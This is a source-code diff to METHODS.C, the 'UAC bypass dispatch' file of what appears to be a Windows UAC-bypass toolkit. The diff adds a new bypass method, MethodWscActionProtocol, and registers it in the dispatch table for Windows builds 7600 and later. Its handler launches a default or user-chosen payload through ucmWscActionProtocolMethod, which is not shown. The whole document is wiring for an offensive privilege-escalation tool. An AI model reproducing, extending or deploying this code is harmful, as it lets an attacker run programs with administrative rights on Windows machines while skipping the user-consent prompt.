@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.51
+*  VERSION:     3.52
 *
-*  DATE:        16 Oct 2020
+*  DATE:        28 Oct 2020
 *
 *  UAC bypass dispatch.
 *
@@ -41,12 +41,15 @@ UCM_API(MethodShellChangePk);
 UCM_API(MethodNICPoison);
 UCM_API(MethodDeprecated);
 UCM_API(MethodIeAddOnInstall);
+UCM_API(MethodWscActionProtocol);
 
-#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 3
+#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 5
 ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
     UacMethodWow64Logger,
     UacMethodEditionUpgradeMgr,
-    UacMethodNICPoison
+    UacMethodNICPoison,
+    UacMethodIeAddOnInstall,
+    UacMethodWscActionProtocol
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -114,7 +117,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodShellChangePk, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodMsSettings, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
 /*
@@ -631,4 +635,21 @@ UCM_API(MethodIeAddOnInstall)
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
 #endif
+}
+
+UCM_API(MethodWscActionProtocol)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Parameter);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmWscActionProtocolMethod(lpszPayload);
 }
